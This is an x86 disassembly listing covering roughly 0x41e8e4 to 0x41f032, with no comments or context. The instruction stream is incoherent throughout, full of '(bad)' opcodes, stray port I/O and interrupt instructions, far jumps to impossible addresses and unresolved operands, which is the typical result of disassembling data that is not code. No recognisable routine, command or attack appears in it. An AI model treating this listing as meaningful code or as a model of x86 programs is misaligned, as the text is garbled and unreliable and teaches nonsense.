  41e8e4:	sub    eax,DWORD PTR [esi-0xbe7f59b]
  41e8ea:	jge    0x41e88d
  41e8ec:	in     eax,dx
  41e8ed:	push   ebx
  41e8ee:	test   al,0x24
  41e8f0:	dec    eax
  41e8f1:	dec    edi
  41e8f2:	mov    edx,0x562121f7
  41e8f7:	aaa    
  41e8f8:	lea    esp,[edi]
  41e8fa:	out    0xbc,eax
  41e8fc:	jbe    0x41e906
  41e8fe:	mov    BYTE PTR fs:[esi-0x2ffe54f0],cl
  41e905:	push   0x61
  41e907:	pop    ss
  41e908:	lods   eax,DWORD PTR ds:[esi]
  41e909:	leave  
  41e90a:	xchg   edx,eax
  41e90b:	icebp  
  41e90c:	test   DWORD PTR [esp+eax*2-0x2e8ea52b],esi
  41e913:	add    dl,ch
  41e915:	ss aaa 
  41e917:	xchg   ecx,eax
  41e918:	scas   eax,DWORD PTR es:[edi]
  41e919:	sub    BYTE PTR [edx-0x7c870876],al
  41e91f:	push   esi
  41e920:	cmc    
  41e921:	push   ecx
  41e922:	push   edx
  41e923:	cmp    al,0xb8
  41e925:	xlat   BYTE PTR ds:[ebx]
  41e926:	jle    0x41e913
  41e928:	addr16 es out dx,eax
  41e92b:	mov    fs,esi
  41e92d:	loopne 0x41e8b8
  41e92f:	dec    ecx
  41e930:	popf   
  41e931:	fmul   QWORD PTR [ecx-0x64c2a7ad]
  41e937:	stc    
  41e938:	add    ebx,eax
  41e93a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e93b:	add    al,0xe3
  41e93d:	push   ebp
  41e93e:	sahf   
  41e93f:	inc    eax
  41e940:	cmp    eax,0x4ebda023
  41e945:	mov    BYTE PTR [edi-0x46],bh
  41e948:	int    0x7b
  41e94a:	pop    eax
  41e94b:	aad    0xba
  41e94d:	sar    DWORD PTR [eax-0x68],1
  41e950:	pop    ebp
  41e951:	sbb    bh,BYTE PTR [eax+0x2d]
  41e954:	fldenv [esi-0x3bcb31df]
  41e95a:	rcl    BYTE PTR [edx+eiz*4],cl
  41e95d:	shr    bh,cl
  41e95f:	xchg   ecx,eax
  41e960:	lea    edx,[edi]
  41e962:	inc    esp
  41e963:	bound  esi,QWORD PTR [ecx+ebx*1+0x458e599e]
  41e96a:	cmp    esp,ebp
  41e96c:	sbb    al,0x91
  41e96e:	loop   0x41e996
  41e970:	hlt    
  41e971:	test   eax,0xec33d4f1
  41e976:	or     eax,0xb538553e
  41e97b:	xor    DWORD PTR [edi+0x2d],edi
  41e97e:	push   ss
  41e97f:	xor    ch,BYTE PTR [edi]
  41e981:	jmp    FWORD PTR [edx-0x4f]
  41e984:	pop    edi
  41e985:	sar    BYTE PTR [edx-0x5ec64e7b],cl
  41e98b:	(bad)  
  41e98c:	cli    
  41e98d:	test   BYTE PTR [edx-0x70],dl
  41e990:	or     edi,ebx
  41e992:	push   eax
  41e993:	xor    eax,0x2cfb000d
  41e998:	(bad)  [ebp+0x28e1f07c]
  41e99e:	sbb    al,0x69
  41e9a0:	sahf   
  41e9a1:	push   ebp
  41e9a2:	jp     0x41e946
  41e9a4:	cmp    dl,cl
  41e9a6:	mov    ax,ds:0x6b604447
  41e9ac:	imul   ebx,DWORD PTR ds:[ebx+0x75],0x620097e0
  41e9b4:	adc    di,dx
  41e9b7:	into   
  41e9b8:	sub    al,0xa4
  41e9ba:	push   edi
  41e9bb:	(bad)  
  41e9bc:	mov    eax,ds:0xd32e3769
  41e9c1:	dec    ebp
  41e9c2:	adc    edx,edi
  41e9c4:	pop    ebp
  41e9c5:	sbb    eax,0x125b933e
  41e9ca:	rcl    ebp,cl
  41e9cc:	fwait
  41e9cd:	inc    edi
  41e9ce:	jmp    0x41e9d7
  41e9d0:	jg     0x41e9e6
  41e9d2:	stos   BYTE PTR es:[edi],al
  41e9d3:	jnp    0x41e97f
  41e9d5:	ficom  WORD PTR [ebx]
  41e9d7:	add    ch,BYTE PTR [eax-0x20]
  41e9da:	scas   al,BYTE PTR es:[edi]
  41e9db:	adc    ebp,DWORD PTR [edx-0x1dd7a068]
  41e9e1:	jp     0x41e9f0
  41e9e3:	dec    esp
  41e9e4:	jge    0x41e9c3
  41e9e6:	dec    esi
  41e9e7:	mov    ds:0x4105f6f2,eax
  41e9ec:	push   ebp
  41e9ed:	sub    eax,DWORD PTR [edi]
  41e9ef:	scas   eax,DWORD PTR es:[edi]
  41e9f0:	push   ss
  41e9f1:	mov    ds:0x64e8b967,eax
  41e9f6:	sti    
  41e9f7:	push   ss
  41e9f8:	das    
  41e9f9:	test   DWORD PTR [eax],eax
  41e9fb:	pop    es
  41e9fc:	jge    0x41ea20
  41e9fe:	and    ebx,DWORD PTR [ebp+0x5b81a3b]
  41ea04:	mov    eax,ds:0x30901fea
  41ea09:	mov    eax,0xd1c65c29
  41ea0e:	mov    ch,0x28
  41ea10:	jo     0x41ea87
  41ea12:	jmp    0xc877cf16
  41ea17:	pop    ebp
  41ea18:	or     BYTE PTR [ecx-0x1e956670],al
  41ea1e:	mov    ecx,0x9c5a1bee
  41ea23:	outs   dx,DWORD PTR ds:[esi]
  41ea24:	mov    al,ds:0x793d33b6
  41ea29:	ins    DWORD PTR es:[edi],dx
  41ea2a:	jge    0x41ea21
  41ea2c:	pop    eax
  41ea2d:	push   esp
  41ea2e:	pop    esp
  41ea2f:	jmp    0x1ffe7777
  41ea34:	(bad)  
  41ea35:	fiadd  DWORD PTR [ebx+0x1d604dff]
  41ea3b:	inc    edx
  41ea3c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea3d:	push   cs
  41ea3e:	repnz sbb esi,DWORD PTR fs:[edi-0x4bed4928]
  41ea46:	js     0x41ea28
  41ea48:	mov    ds:0xe8341d51,eax
  41ea4d:	test   DWORD PTR [edi+esi*4+0x2df3cca6],0x10421910
  41ea58:	aas    
  41ea59:	pop    ds
  41ea5a:	pop    ebp
  41ea5b:	aaa    
  41ea5c:	test   BYTE PTR [esi],dl
  41ea5e:	xor    al,0xe
  41ea60:	les    edx,FWORD PTR [ecx-0xc]
  41ea63:	pop    es
  41ea64:	sar    DWORD PTR [esi+0x4e],1
  41ea67:	pop    ecx
  41ea68:	add    DWORD PTR [edi-0x9],edx
  41ea6b:	mov    ds:0x312172e3,al
  41ea70:	gs mov ch,0x80
  41ea73:	cwde   
  41ea74:	(bad)  
  41ea76:	mov    gs,WORD PTR [ecx+0x71880004]
  41ea7c:	outs   dx,DWORD PTR ds:[esi]
  41ea7d:	cmp    DWORD PTR [ebx],esi
  41ea7f:	test   al,0x9d
  41ea81:	pusha  
  41ea82:	or     bh,dh
  41ea84:	fidivr DWORD PTR [ebx]
  41ea86:	mov    bh,0xa8
  41ea88:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea89:	push   esp
  41ea8a:	or     dl,BYTE PTR [edx+0x485ceac8]
  41ea90:	aad    0x3b
  41ea92:	fs loope 0x41eaf1
  41ea95:	xor    eax,0xeb0696e3
  41ea9a:	push   ds
  41ea9b:	gs loope 0x41eb0b
  41ea9e:	fldenv [edx+0x84fa16e]
  41eaa4:	and    DWORD PTR [edi+0x64d8f526],esi
  41eaaa:	test   DWORD PTR [ebp-0x52634da],ebx
  41eab0:	xchg   BYTE PTR [edx+0x7d803156],dl
  41eab6:	xchg   DWORD PTR [edi-0xf],esi
  41eab9:	or     al,0x75
  41eabb:	pop    eax
  41eabc:	jle    0x41eb30
  41eabe:	mov    bl,0x5b
  41eac0:	out    dx,eax
  41eac1:	sbb    DWORD PTR [eax+0x59],eax
  41eac4:	dec    ebx
  41eac5:	fwait
  41eac6:	in     eax,0x47
  41eac8:	(bad)  
  41eac9:	dec    eax
  41eaca:	je     0x41eadf
  41eacc:	xchg   dx,ax
  41eace:	enter  0x3ec6,0xa5
  41ead2:	test   al,0xf5
  41ead4:	in     eax,0x37
  41ead6:	(bad)  
  41ead7:	push   edi
  41ead8:	sub    DWORD PTR [eax-0x16829f6d],ecx
  41eade:	dec    ecx
  41eadf:	dec    eax
  41eae0:	push   ss
  41eae1:	popa   
  41eae2:	xchg   ebx,eax
  41eae3:	or     ecx,DWORD PTR [edi]
  41eae5:	sbb    BYTE PTR [ebx-0x40],bl
  41eae8:	call   0x9864:0xc365e339
  41eaef:	inc    eax
  41eaf0:	repz push ecx
  41eaf2:	sub    al,0x33
  41eaf4:	push   ss
  41eaf5:	rol    BYTE PTR [ebp+0x2],1
  41eaf8:	imul   edx,DWORD PTR [eax],0xe1d86469
  41eafe:	xor    eax,0x6948fe35
  41eb03:	and    al,BYTE PTR [ebx-0x19]
  41eb06:	adc    DWORD PTR [ebx],edi
  41eb08:	push   0x6b
  41eb0a:	enter  0xb026,0xe7
  41eb0e:	inc    esi
  41eb0f:	cmp    DWORD PTR [ecx+0x3b],eax
  41eb12:	in     al,dx
  41eb13:	xchg   edi,eax
  41eb14:	push   cs
  41eb15:	cmp    al,BYTE PTR [eax+0x24]
  41eb18:	dec    dl
  41eb1a:	add    DWORD PTR [ebp+0xf737d22],0x7a
  41eb21:	push   eax
  41eb22:	xchg   ebp,eax
  41eb23:	push   es
  41eb24:	push   ebx
  41eb25:	test   BYTE PTR cs:[eax-0x6c5fd31],dh
  41eb2c:	sti    
  41eb2d:	pop    eax
  41eb2e:	sub    DWORD PTR [eax+0x57],ecx
  41eb31:	test   esp,0xe394b39b
  41eb37:	or     BYTE PTR [ebx-0xb06ad48],cl
  41eb3d:	mov    ebp,0xb9da499d
  41eb42:	rcr    BYTE PTR [ebp+0x1],cl
  41eb45:	or     al,0x34
  41eb47:	sbb    edx,DWORD PTR [ecx+0x106cde18]
  41eb4d:	fldcw  WORD PTR gs:[edi]
  41eb50:	(bad)  
  41eb51:	paddb  mm0,mm7
  41eb54:	std    
  41eb55:	test   al,0xec
  41eb57:	scas   al,BYTE PTR es:[edi]
  41eb58:	in     al,dx
  41eb59:	mov    esp,ebx
  41eb5b:	test   ah,bh
  41eb5d:	xor    dl,0x2f
  41eb60:	or     esp,DWORD PTR [eax+0x4f32bff4]
  41eb66:	push   edx
  41eb67:	and    al,0xd0
  41eb69:	clc    
  41eb6a:	pop    ecx
  41eb6b:	(bad)  
  41eb6c:	std    
  41eb6d:	cmp    BYTE PTR gs:[edi+edi*4-0x7410fe5a],0x86
  41eb76:	adc    BYTE PTR [ecx+0x20],ah
  41eb79:	pop    esi
  41eb7a:	xchg   ebp,eax
  41eb7b:	in     al,dx
  41eb7c:	adc    BYTE PTR [eax+0x69],bl
  41eb7f:	add    BYTE PTR [edi],0x25
  41eb82:	fidiv  DWORD PTR [ebp+0x39]
  41eb85:	in     al,dx
  41eb86:	test   DWORD PTR [edx+ebp*4+0x65],eax
  41eb8a:	jnp    0x41eb21
  41eb8c:	dec    ebp
  41eb8d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41eb8e:	mov    edi,0x55bbd434
  41eb93:	pop    ebp
  41eb94:	clc    
  41eb95:	xchg   BYTE PTR [esi-0x29],al
  41eb98:	jno    0x41eb9f
  41eb9a:	pusha  
  41eb9b:	out    0xe3,al
  41eb9d:	out    dx,eax
  41eb9e:	or     al,0x88
  41eba0:	dec    ebx
  41eba1:	outs   dx,BYTE PTR ds:[esi]
  41eba2:	frstor [esi]
  41eba4:	sub    DWORD PTR [eax],esi
  41eba6:	fnstcw WORD PTR [eax]
  41eba8:	push   ds
  41eba9:	push   0xffffffab
  41ebab:	add    BYTE PTR [edx+0x33d771bd],dl
  41ebb1:	mov    ecx,0x1a83b622
  41ebb6:	mov    WORD PTR [edx+0x70],ss
  41ebb9:	std    
  41ebba:	nop
  41ebbb:	retf   0x92cc
  41ebbe:	fist   WORD PTR [edx+0x2de13001]
  41ebc4:	fsub   QWORD PTR [edx]
  41ebc6:	mov    ch,BYTE PTR [ebx]
  41ebc8:	nop
  41ebc9:	js     0x41ec16
  41ebcb:	adc    BYTE PTR [esi],al
  41ebcd:	mov    ah,0x53
  41ebcf:	xor    dh,BYTE PTR [edx+0x24]
  41ebd2:	adc    BYTE PTR [eax-0x28dea815],ch
  41ebd8:	mov    eax,ds:0x6585e03
  41ebdd:	inc    ebp
  41ebde:	lods   al,BYTE PTR ds:[esi]
  41ebdf:	push   ebp
  41ebe0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ebe1:	push   0xffffff9f
  41ebe3:	xor    esp,ecx
  41ebe5:	cmp    al,0xb3
  41ebe7:	fs sbb eax,ebp
  41ebea:	and    cl,BYTE PTR [edx+0x4362213d]
  41ebf0:	and    eax,DWORD PTR [edx+edx*1]
  41ebf3:	inc    esp
  41ebf4:	hlt    
  41ebf5:	mov    edi,0xa97acd78
  41ebfa:	mov    bl,0xb1
  41ebfc:	mov    ebp,0x21dc9894
  41ec01:	inc    eax
  41ec02:	xchg   esp,eax
  41ec03:	cmp    edx,edi
  41ec05:	or     al,0xdd
  41ec07:	stos   BYTE PTR es:[edi],al
  41ec08:	jp     0x41ec61
  41ec0a:	ds repnz pop edi
  41ec0d:	js     0x41ec3c
  41ec0f:	aam    0xbc
  41ec11:	sub    bh,BYTE PTR [ecx]
  41ec13:	cmp    eax,0xfa7e50a1
  41ec18:	dec    eax
  41ec19:	(bad)  
  41ec1a:	daa    
  41ec1b:	call   0x4d3c:0x2cea1fa0
  41ec22:	aam    0x5f
  41ec24:	(bad)  [edi+0x5c553d58]
  41ec2a:	psrlq  mm4,mm3
  41ec2d:	and    esp,DWORD PTR [ebx]
  41ec2f:	xor    al,cl
  41ec31:	dec    esp
  41ec32:	mov    esi,0x29bb3d42
  41ec37:	jns    0x41ebd8
  41ec39:	mov    edi,0xcd59ef88
  41ec3e:	repz lock mov edi,0xc5824763
  41ec45:	mov    ds:0xdaf6e729,eax
  41ec4a:	adc    eax,0x518875c1
  41ec4f:	or     dl,BYTE PTR [edx+0x68cee5a2]
  41ec55:	into   
  41ec56:	loopne 0x41ec27
  41ec58:	push   esi
  41ec59:	xchg   esi,eax
  41ec5a:	repz mov eax,ds:0x848fd74c
  41ec60:	lods   al,BYTE PTR ds:[esi]
  41ec61:	stos   DWORD PTR es:[edi],eax
  41ec62:	icebp  
  41ec63:	or     BYTE PTR [ecx],0xe1
  41ec66:	int    0x48
  41ec68:	inc    edi
  41ec69:	mov    ds:0xa03be34f,al
  41ec6e:	mov    WORD PTR [eax+0x28f83463],cs
  41ec74:	mov    ch,0xd5
  41ec76:	push   edi
  41ec77:	nop
  41ec78:	pop    es
  41ec79:	dec    DWORD PTR [edx+0x53]
  41ec7c:	mov    esi,0xf09fe4ad
  41ec81:	xchg   ebx,eax
  41ec82:	mov    BYTE PTR [ebx+0x71],bh
  41ec85:	inc    edi
  41ec86:	inc    edx
  41ec87:	jl     0xed56495f
  41ec8d:	mov    al,0xd1
  41ec8f:	mov    esi,?
  41ec91:	cmp    ah,bh
  41ec93:	test   cl,ch
  41ec95:	sti    
  41ec96:	jp     0x41ec82
  41ec98:	jmp    0x9836:0x5e59d70c
  41ec9f:	sbb    BYTE PTR [esi-0x5528a49a],0xec
  41eca6:	jae    0x41ec6f
  41eca8:	mov    bh,0xd3
  41ecaa:	leave  
  41ecab:	neg    bh
  41ecad:	sub    BYTE PTR [edx+0x51c71ddb],cl
  41ecb3:	mov    eax,0xf846b46d
  41ecb8:	sbb    DWORD PTR [ebx+0x10],edx
  41ecbb:	mov    ds:0xba14e221,eax
  41ecc0:	dec    al
  41ecc2:	jmp    0x61df8306
  41ecc7:	xchg   ebp,eax
  41ecc8:	cmc    
  41ecc9:	mov    dl,0x80
  41eccb:	fdiv   DWORD PTR [ebx]
  41eccd:	xlat   BYTE PTR ds:[ebx]
  41ecce:	imul   edx,edi,0xceb138b
  41ecd4:	sahf   
  41ecd5:	pop    eax
  41ecd6:	fidivr WORD PTR [ebx-0x122bafeb]
  41ecdc:	dec    esp
  41ecdd:	js     0x41ed42
  41ecdf:	mov    eax,ds:0x6550452f
  41ece4:	inc    eax
  41ece5:	mov    cl,dl
  41ece7:	xor    eax,0x5498d928
  41ecec:	rcr    BYTE PTR [ebp-0x7],0xda
  41ecf0:	cs fdiv st,st(0)
  41ecf3:	mov    ebp,0xc43bbf43
  41ecf8:	xchg   DWORD PTR ss:[ebp+0x26793014],edx
  41ecff:	ficomp DWORD PTR [ebx+0x6ed33ed7]
  41ed05:	or     BYTE PTR [ebp-0x6],ch
  41ed08:	and    ebx,edi
  41ed0a:	ret    0x2766
  41ed0d:	dec    esi
  41ed0e:	cwde   
  41ed0f:	pop    ebx
  41ed10:	pop    esp
  41ed11:	ins    BYTE PTR es:[edi],dx
  41ed12:	sbb    al,0x3d
  41ed14:	cld    
  41ed15:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ed16:	mov    dl,0xb2
  41ed18:	pop    edx
  41ed19:	add    BYTE PTR ds:0xb541998f,ch
  41ed1f:	push   cs
  41ed20:	add    eax,0x8f3fba78
  41ed25:	pop    es
  41ed26:	in     al,dx
  41ed27:	pop    ebp
  41ed28:	fcmove st,st(6)
  41ed2a:	daa    
  41ed2b:	loope  0x41ecd6
  41ed2d:	fisub  WORD PTR [ebx]
  41ed2f:	arpl   WORD PTR [ebx+0x17194063],cx
  41ed35:	dec    eax
  41ed36:	loop   0x41ece1
  41ed38:	cdq    
  41ed39:	xchg   ebp,eax
  41ed3a:	add    eax,0x3c0c21e4
  41ed3f:	popa   
  41ed40:	repz cmc 
  41ed42:	out    dx,al
  41ed43:	jl     0x41ed7d
  41ed45:	fisttp DWORD PTR [eax-0x54]
  41ed48:	dec    edi
  41ed49:	pop    es
  41ed4a:	dec    ecx
  41ed4b:	arpl   WORD PTR [ebx],sp
  41ed4d:	sbb    eax,0x23575fd7
  41ed52:	and    DWORD PTR [eax],esp
  41ed54:	neg    DWORD PTR [ebp+0x1d]
  41ed57:	sbb    BYTE PTR [edx+0x111c4235],bl
  41ed5d:	cwde   
  41ed5e:	retf   0xa027
  41ed61:	cmp    BYTE PTR [ebx-0x26ac6187],ah
  41ed67:	stos   BYTE PTR es:[edi],al
  41ed68:	cwde   
  41ed69:	icebp  
  41ed6a:	xchg   ecx,eax
  41ed6b:	cmp    al,0x7e
  41ed6d:	jle    0x41ed8b
  41ed6f:	xlat   BYTE PTR ds:[ebx]
  41ed70:	mov    esp,0x68660c4c
  41ed75:	cmp    ch,bh
  41ed77:	js     0x41ed46
  41ed79:	pop    ecx
  41ed7a:	outs   dx,BYTE PTR ds:[si]
  41ed7c:	xor    al,0xc8
  41ed7e:	stc    
  41ed7f:	adc    BYTE PTR [edi],cl
  41ed81:	mov    bh,BYTE PTR [eax]
  41ed83:	leave  
  41ed84:	pop    ss
  41ed85:	test   eax,0x625ab740
  41ed8a:	pop    eax
  41ed8b:	or     DWORD PTR [edx+edx*8-0xe],ebx
  41ed8f:	mov    ebx,DWORD PTR [eax]
  41ed91:	stc    
  41ed92:	jg     0x41ed6d
  41ed94:	pop    esp
  41ed95:	imul   esp,DWORD PTR [ebx+0x79],0x68
  41ed99:	or     eax,0xc74f3fde
  41ed9e:	mov    bl,0x5b
  41eda0:	bnd jg 0x41ed9e
  41eda3:	dec    edx
  41eda4:	or     esp,0x1
  41eda7:	cld    
  41eda8:	das    
  41eda9:	cmp    cl,BYTE PTR [ebx-0x76b59924]
  41edaf:	aaa    
  41edb0:	adc    BYTE PTR [esi+0x5f],dh
  41edb3:	data16 lods al,BYTE PTR ds:[esi]
  41edb5:	mov    ebp,0x80dc6b7f
  41edba:	pop    esp
  41edbb:	rcr    DWORD PTR [ebp+0xd],0xfa
  41edbf:	jg     0x41edd3
  41edc1:	test   eax,edx
  41edc3:	xor    BYTE PTR [ebx],bh
  41edc5:	jb     0x41ee09
  41edc7:	xchg   esi,eax
  41edc8:	pop    esp
  41edc9:	pop    ecx
  41edca:	ins    DWORD PTR es:[edi],dx
  41edcb:	ds and DWORD PTR gs:[edx],ecx
  41edcf:	shr    BYTE PTR ds:0x542b49d5,0x91
  41edd6:	add    BYTE PTR [edx-0x32],ah
  41edd9:	pop    ss
  41edda:	in     eax,dx
  41eddb:	inc    ecx
  41eddc:	enter  0x9441,0xae
  41ede0:	repz not DWORD PTR [edx]
  41ede3:	add    eax,0x8cecd0ea
  41ede8:	js     0x41ee5d
  41edea:	ret    
  41edeb:	sbb    DWORD PTR [edx-0x70390c26],0xf87a239
  41edf5:	pop    ebp
  41edf6:	add    ecx,DWORD PTR [esi-0x56e5f5fd]
  41edfc:	mov    ebp,0xc9493982
  41ee01:	cmp    BYTE PTR [ebp+0x26],al
  41ee04:	xchg   BYTE PTR [edx-0x6e905d9e],ah
  41ee0a:	mov    edi,0x7e037c7f
  41ee0f:	imul   ebx,DWORD PTR [eax],0xffffff99
  41ee12:	sbb    DWORD PTR [esi+0x28],eax
  41ee15:	std    
  41ee16:	mov    ch,0xbc
  41ee18:	sti    
  41ee19:	fimul  WORD PTR [ecx+ebx*4]
  41ee1c:	mov    dl,0xe6
  41ee1e:	and    eax,0x641e3a9b
  41ee23:	mov    ah,0xd9
  41ee25:	add    BYTE PTR [ecx+0x6f0f560f],ch
  41ee2b:	pusha  
  41ee2c:	add    eax,0x9bc6f520
  41ee31:	push   0x8366cfe6
  41ee36:	cli    
  41ee37:	cli    
  41ee38:	fucomp st(0)
  41ee3a:	int    0xe3
  41ee3c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ee3d:	imul   eax,esp,0xffffffb6
  41ee40:	mov    BYTE PTR [edi],dh
  41ee42:	maxps  xmm2,XMMWORD PTR [esp+eiz*8+0x25]
  41ee47:	imul   ebp,ecx,0x3496ab66
  41ee4d:	or     DWORD PTR ss:[ebp+0x58],0x15
  41ee52:	sahf   
  41ee53:	dec    esp
  41ee54:	fdivr  st,st(7)
  41ee56:	test   DWORD PTR [edx+0x64],ecx
  41ee59:	sub    edx,ebp
  41ee5b:	sti    
  41ee5c:	rcr    BYTE PTR [eax+0x66be6fdb],1
  41ee62:	or     DWORD PTR [edi],ebx
  41ee64:	adc    DWORD PTR [edi-0x55],edi
  41ee67:	stos   DWORD PTR es:[edi],eax
  41ee68:	pop    eax
  41ee69:	pop    ebp
  41ee6a:	sbb    ebx,DWORD PTR [esi+0x69]
  41ee6d:	xchg   BYTE PTR [eax+0x5b],dl
  41ee70:	das    
  41ee71:	xor    BYTE PTR [edx],ch
  41ee73:	ret    
  41ee74:	inc    ebx
  41ee75:	aam    0x4a
  41ee77:	cmp    BYTE PTR [ecx],bl
  41ee79:	jo     0x41eec6
  41ee7b:	xlat   BYTE PTR ds:[ebx]
  41ee7c:	adc    ebp,DWORD PTR [edx-0x6df9822a]
  41ee82:	inc    esp
  41ee83:	je     0x41eecc
  41ee85:	test   eax,0x98662050
  41ee8a:	leave  
  41ee8b:	(bad)  
  41ee8c:	jns    0x41ee91
  41ee8e:	cmp    BYTE PTR [edi],bl
  41ee90:	push   esi
  41ee91:	nop
  41ee92:	out    dx,eax
  41ee93:	int3   
  41ee94:	ret    0x99e2
  41ee97:	mov    esi,0x4d5f30d9
  41ee9c:	mov    ebp,0x183284f
  41eea1:	push   ebp
  41eea2:	sbb    eax,0xefd15799
  41eea7:	push   es
  41eea8:	sbb    ah,dl
  41eeaa:	xor    al,0xb3
  41eeac:	push   0x720bd773
  41eeb1:	sub    edi,DWORD PTR [ecx]
  41eeb3:	xchg   edx,eax
  41eeb4:	jns    0x41ef29
  41eeb6:	adc    DWORD PTR [edx+0x3f12dd13],edi
  41eebc:	popa   
  41eebd:	int    0xd7
  41eebf:	sbb    al,0xd6
  41eec1:	add    ebx,DWORD PTR [eax+0x15]
  41eec4:	push   esi
  41eec5:	mov    ebx,DWORD PTR [edi-0x7d4e045b]
  41eecb:	or     edx,DWORD PTR [ecx-0x3d]
  41eece:	mov    ebx,?
  41eed0:	cmp    ebp,DWORD PTR [edi-0x2b]
  41eed3:	cld    
  41eed4:	loope  0x41ef32
  41eed6:	iret   
  41eed7:	(bad)  
  41eed8:	sar    DWORD PTR [esi-0x6f],1
  41eedb:	fnstenv [edx+0x4b]
  41eede:	out    dx,al
  41eedf:	and    bl,BYTE PTR [eax-0x8]
  41eee2:	fwait
  41eee3:	pop    edx
  41eee4:	repz mov bh,0xb4
  41eee7:	ja     0x41eec0
  41eee9:	mov    fs,WORD PTR [ebx+0x55]
  41eeec:	inc    edx
  41eeed:	xchg   esp,eax
  41eeee:	inc    esp
  41eeef:	aaa    
  41eef0:	jnp    0x41eed5
  41eef2:	dec    ebx
  41eef3:	push   0xb51313c9
  41eef8:	cmp    eax,0xaefcbf60
  41eefd:	inc    esi
  41eefe:	(bad)  
  41eeff:	push   esp
  41ef00:	setno  BYTE PTR [esi-0x55]
  41ef04:	scas   eax,DWORD PTR es:[edi]
  41ef05:	sub    eax,0x87f53e45
  41ef0a:	xchg   ecx,eax
  41ef0b:	add    ebx,DWORD PTR [ecx+ebx*1+0xfdc9f53]
  41ef12:	push   ebp
  41ef13:	in     eax,dx
  41ef14:	out    dx,eax
  41ef15:	vpmacswd ymm9,ymm6,ymm0,ymm5
  41ef1b:	inc    esp
  41ef1c:	aas    
  41ef1d:	pop    esp
  41ef1e:	pop    es
  41ef1f:	daa    
  41ef20:	dec    ebp
  41ef21:	dec    esp
  41ef22:	stos   DWORD PTR es:[edi],eax
  41ef23:	clc    
  41ef24:	aas    
  41ef25:	mov    al,0xca
  41ef27:	jmp    DWORD PTR cs:[eax-0x697214fa]
  41ef2e:	fisubr WORD PTR [edx+edx*4+0x57eb665f]
  41ef35:	test   DWORD PTR [esi],ebx
  41ef37:	cmc    
  41ef38:	mov    ds,WORD PTR [edx]
  41ef3a:	retf   
  41ef3b:	mov    dh,0x82
  41ef3d:	setl   BYTE PTR [ebp-0x1f]
  41ef41:	add    DWORD PTR [edx+0x33],eax
  41ef44:	inc    edi
  41ef45:	rcl    BYTE PTR [esi],cl
  41ef47:	dec    edx
  41ef48:	xchg   edx,eax
  41ef49:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ef4a:	jno    0x41ef3c
  41ef4c:	cmp    cl,BYTE PTR [edi+eax*1]
  41ef4f:	sbb    DWORD PTR [esi+0x21f9d61],ebx
  41ef55:	ret    0x4f69
  41ef58:	test   al,0xaf
  41ef5b:	retf   
  41ef5c:	inc    ebp
  41ef5d:	out    dx,eax
  41ef5e:	enter  0x3fd6,0x3b
  41ef62:	repz add al,0x3e
  41ef65:	jmp    0x41ef5c
  41ef67:	xchg   esp,eax
  41ef68:	dec    ecx
  41ef69:	cmp    ch,BYTE PTR [edx+0x58]
  41ef6c:	push   esi
  41ef6d:	push   ds
  41ef6e:	lahf   
  41ef6f:	out    0x78,eax
  41ef71:	les    edx,FWORD PTR [ecx+0x4f]
  41ef74:	loope  0x41ef34
  41ef76:	leave  
  41ef77:	dec    esp
  41ef78:	into   
  41ef79:	int3   
  41ef7a:	outs   dx,DWORD PTR ds:[esi]
  41ef7b:	test   eax,0x8557836b
  41ef80:	repz fsubr st(4),st
  41ef83:	xchg   edx,eax
  41ef84:	aas    
  41ef85:	jne    0x41ef80
  41ef87:	xor    ecx,ecx
  41ef89:	pushf  
  41ef8a:	fwait
  41ef8b:	and    eax,ebx
  41ef8d:	mov    cl,0x8c
  41ef8f:	push   esp
  41ef90:	or     eax,0x70460ace
  41ef95:	pop    edx
  41ef96:	test   DWORD PTR [eax+0x7d861a2a],esi
  41ef9c:	jmp    0xe0f8:0x2fb390e2
  41efa3:	test   edx,eax
  41efa5:	cmp    DWORD PTR [ebp-0x73],0x15805921
  41efac:	fild   DWORD PTR [ebx-0x39]
  41efaf:	pusha  
  41efb0:	loope  0x41ef71
  41efb2:	dec    edi
  41efb3:	iret   
  41efb4:	cwde   
  41efb5:	inc    ebx
  41efb6:	aad    0x3e
  41efb8:	ins    DWORD PTR es:[edi],dx
  41efb9:	cmp    al,0x0
  41efbb:	cmp    ecx,DWORD PTR [edi]
  41efbd:	mov    al,0x26
  41efbf:	or     al,0x35
  41efc1:	std    
  41efc2:	mov    dh,0xdd
  41efc4:	in     eax,dx
  41efc5:	pop    ss
  41efc6:	sbb    al,BYTE PTR [ebx]
  41efc8:	cmp    DWORD PTR gs:[esi+0x2a2a2c36],ebx
  41efcf:	aam    0x6d
  41efd1:	lods   eax,DWORD PTR ds:[esi]
  41efd2:	sbb    eax,DWORD PTR [eax-0x1c]
  41efd5:	inc    edx
  41efd6:	cdq    
  41efd7:	test   DWORD PTR [ebx],ebx
  41efd9:	jns    0x41ef7d
  41efdb:	mov    ch,0x2d
  41efdd:	dec    esp
  41efde:	mov    ch,0xc5
  41efe0:	repz sar bl,1
  41efe3:	mov    DWORD PTR [ecx+0x544eae7b],ecx
  41efe9:	mul    DWORD PTR [ebx]
  41efeb:	mov    BYTE PTR [eax-0x39],ch
  41efee:	loope  0x41efe5
  41eff0:	or     esi,edx
  41eff2:	or     dl,bh
  41eff4:	jne    0x41f066
  41eff6:	retf   
  41eff7:	inc    esp
  41eff8:	in     al,0xa7
  41effa:	(bad)  
  41effb:	pop    ebp
  41effc:	mov    ch,0x20
  41effe:	mov    ah,0xab
  41f000:	push   cs
  41f001:	retf   0x4a76
  41f004:	jne    0x41f03d
  41f006:	shl    BYTE PTR [ebp+0x5a],0x87
  41f00a:	mov    esp,0xe002a50f
  41f00f:	mov    eax,0xfabbc11e
  41f014:	cmp    cl,ch
  41f016:	cmp    eax,0x9f2059a5
  41f01b:	(bad)  
  41f01c:	pushf  
  41f01d:	jp     0x41f000
  41f01f:	xchg   ebp,eax
  41f020:	sub    cl,BYTE PTR ds:0xd40bfca9
  41f026:	and    DWORD PTR [ecx-0x7ae821b2],ebx
  41f02c:	mov    bh,0xd8
  41f02f:	fdiv   QWORD PTR [ebx-0x19]
  41f032:	push   esp
